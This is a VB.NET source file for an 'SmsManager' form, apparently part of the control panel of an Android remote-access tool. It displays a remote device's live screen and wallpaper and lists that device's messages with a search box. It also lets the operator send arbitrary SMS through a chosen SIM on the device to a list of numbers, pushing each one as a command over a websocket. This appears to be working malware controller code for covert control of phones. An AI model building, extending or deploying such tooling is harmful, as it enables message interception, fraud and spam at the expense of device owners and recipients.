Imports System.Net
Imports System.Net.Sockets

Public Class SmsManager
    Public Btcli As BTClient
    Sub New()

        ' This call is required by the designer.
        InitializeComponent()

        ' Add any initialization after the InitializeComponent() call.

    End Sub

    Private Sub DGV0_SelectionChanged(sender As Object, e As EventArgs) Handles DGV0.SelectionChanged
        If DGV0.SelectedRows.Count = 1 Then
            logtext.Text = DGV0.SelectedRows(0).Tag.ToString
        End If
    End Sub

    Private Sub SmsManager_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.myico.Image = Btcli.wallpaper
        Me.myscr.Image = Btcli.screen
        SetDoubleBuffered(DGV0)
        statetimer.Start()


    End Sub


    Private Sub statetimer_Tick(sender As Object, e As EventArgs) Handles statetimer.Tick
        Try
            If Btcli.isConnected Then
                Me.myscr.Image = Btcli.screen
                Me.myico.Image = Btcli.wallpaper
                Me.mytitle.Text = Messagesstr & " | " & Btcli.name & " | " & Btcli.country

            Else
                Me.myico.Image = My.Resources.no_con
                Me.myscr.Image = Nothing
                Me.mytitle.Text = Messagesstr & " | " & BTConst.Disconnectedstr

            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub SmsManager_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        statetimer.Stop()
    End Sub
    Private searchTimer As Timer
    Private Sub searchtext_TextChanged(sender As Object, e As EventArgs) Handles searchtext.TextChanged
        If searchTimer Is Nothing Then
            searchTimer = New Timer()
            AddHandler searchTimer.Tick, AddressOf PerformSearch
            searchTimer.Interval = 300 ' milliseconds
        End If

        searchTimer.Stop()
        searchTimer.Start()
    End Sub
    Private Sub PerformSearch(sender As Object, e As EventArgs)
        searchTimer.Stop()

        If String.IsNullOrWhiteSpace(searchtext.Text) Then
            emptysearch.Visible = False
            ShowAllRows()
        Else
            emptysearch.Visible = True
            trysearch()
        End If
    End Sub
    Private Declare Auto Function SendMessage Lib "user32.dll" (hWnd As IntPtr, msg As Integer, wParam As Boolean, lParam As Integer) As IntPtr
    Private Const WM_SETREDRAW As Integer = &HB

    Private Sub SuspendDrawing(grid As DataGridView)
        SendMessage(grid.Handle, WM_SETREDRAW, False, 0)
    End Sub

    Private Sub ResumeDrawing(grid As DataGridView)
        SendMessage(grid.Handle, WM_SETREDRAW, True, 0)
        grid.Refresh()
    End Sub

    Public Sub trysearch()
        If DGV0.Rows.Count < 1 Then
            Return
        End If

        If String.IsNullOrEmpty(searchtext.Text) Then
            Return
        End If
        SuspendDrawing(DGV0)
        Dim searchTerm As String = searchtext.Text.ToLower()
        'searchbefore.Clear() ' Clear previous search results

        For Each row As DataGridViewRow In DGV0.Rows
            Try

                Dim rowMatchesSearch As Boolean =
                row.Tag.ToString().ToLower().Contains(searchTerm) OrElse
                row.Cells(0).Value.ToString().ToLower().Contains(searchTerm) OrElse
                row.Cells(1).Value.ToString().ToLower().Contains(searchTerm) OrElse
                row.Cells(2).Value.ToString().ToLower().Contains(searchTerm) OrElse
                row.Cells(3).Value.ToString().ToLower().Contains(searchTerm) OrElse
                row.Cells(4).Value.ToString().ToLower().Contains(searchTerm)

                If rowMatchesSearch Then
                    row.Visible = True ' Show matching rows
                    ' searchbefore.Add(row)
                Else
                    row.Visible = False ' Hide non-matching rows
                End If
            Catch ex As Exception
                ' Handle any potential errors, e.g., if Tag is not a BTClient
            End Try
        Next
        ResumeDrawing(DGV0)
    End Sub

    ' Helper method to show all rows
    Private Sub ShowAllRows()
        For Each row As DataGridViewRow In DGV0.Rows
            row.Visible = True
        Next
    End Sub

    Private Sub emptysearch_Click(sender As Object, e As EventArgs) Handles emptysearch.Click
        searchtext.Text = ""
    End Sub

    Private Sub DrakeUIButtonIcon1_Click(sender As Object, e As EventArgs) Handles DrakeUIButtonIcon1.Click
        Try
            Dim smsmak As New SMSmaker
            smsmak.myico.Image = Btcli.wallpaper

            ' smsmak.combosims
            If Btcli.sim.Contains("/") Then
                Dim allsims() As String = Btcli.sim.Split("/")
                For Each simidx As String In allsims
                    smsmak.combosims.Items.Add(simidx)
                Next
            Else
                If Btcli.sim <> "Known" Then
                    smsmak.combosims.Items.Add(Btcli.sim)
                End If
            End If
            smsmak.mytitle.Text = sndsmstr & " | " & Btcli.name & " | " & Btcli.country
            If smsmak.ShowDialog = DialogResult.OK Then
                If smsmak.numslist.Items.Count > 0 Then


                    Dim msgbody As String = smsmak.msgtext.Text

                    Dim selectedsim As String = "-1" 'All SIM's

                    If smsmak.combosims.Text <> "All SIM's" Then
                        selectedsim = smsmak.combosims.Text
                    End If

                    For index = 0 To smsmak.numslist.Items.Count - 1

                        Dim phonenumber As String = smsmak.numslist.Items(index)
                        If String.IsNullOrEmpty(phonenumber) Or String.IsNullOrWhiteSpace(phonenumber) Then
                            Continue For
                        End If
                        Dim data As New With {
                         .subcommand = "S",
                         .mmssge = msgbody,
                         .ssim = selectedsim,
                         .mnumber = phonenumber
                           }

                        Dim commandstr As String = FormatCommand("SMS", data)


                        Dim chatData As New Dictionary(Of String, Object) From {
                                                            {"msg", wrk},
                                                            {"cmnd", commandstr}
                        }
                        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
                        'Task.Delay(50)

                    Next



                End If

            End If


        Catch ex As Exception

        End Try

    End Sub
End Class